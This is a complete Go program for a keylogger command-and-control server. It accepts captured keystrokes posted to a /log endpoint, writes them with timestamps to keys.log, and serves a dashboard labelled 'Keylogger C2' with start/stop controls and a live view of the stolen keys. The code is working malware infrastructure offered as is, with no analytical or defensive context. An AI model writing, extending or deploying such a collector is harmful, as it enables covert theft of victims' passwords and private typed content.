package main

import (
	"encoding/json"
	"fmt"
	"html/template"
	"log"
	"net/http"
	"os"
	"sync"
	"time"
)

var logs []string
var mu sync.Mutex
var active bool
var f *os.File

func logHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method == "POST" {
		data := r.FormValue("data")
		if data != "" && active {
			mu.Lock()
			logs = append(logs, fmt.Sprintf("[%s] %s", time.Now().Format("15:04:05"), data))
			fmt.Fprintf(f, "%s | %s\n", time.Now().Format("2006-01-02 15:04:05"), data)
			mu.Unlock()
			w.Write([]byte("OK"))
			return
		}
	}

	mu.Lock()
	json.NewEncoder(w).Encode(logs)
	mu.Unlock()
}

func start(w http.ResponseWriter, r *http.Request) {
	active = true
	w.Write([]byte("START"))
}

func stop(w http.ResponseWriter, r *http.Request) {
	active = false
	w.Write([]byte("STOP"))
}

func dashboard(w http.ResponseWriter, r *http.Request) {
	tmpl := `<html><body style="background:black;color:lime;font-family:monospace;padding:20px">
<h1>Keylogger C2 - 10.129.88.92:8080</h1>
<div style="font-size:24px">{{if .Active}}🟢 LIVE{{else}}🔴 STOPPED{{end}} ({{.Count}} keys)</div>
<button onclick="fetch('/start').then(()=>location.reload())">START</button>
<button onclick="fetch('/stop').then(()=>location.reload())">STOP</button>
<pre id="logs" style="background:#111;height:400px;overflow:auto;padding:10px"></pre>
<script>
setInterval(async()=>{
	try{
		const res = await fetch('/log');
		const data = await res.json();
		document.getElementById('logs').textContent = data.join("\n");
	}catch(e){}
},2000);
</script>
</body></html>`

	t := template.Must(template.New("d").Parse(tmpl))

	mu.Lock()
	t.Execute(w, struct {
		Active bool
		Count  int
	}{active, len(logs)})
	mu.Unlock()
}

func main() {
	var err error
	f, err = os.OpenFile("keys.log", os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		log.Fatal(err)
	}
	defer f.Close()

	http.HandleFunc("/", dashboard)
	http.HandleFunc("/log", logHandler)
	http.HandleFunc("/start", start)
	http.HandleFunc("/stop", stop)

	log.Println("Server running on :8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
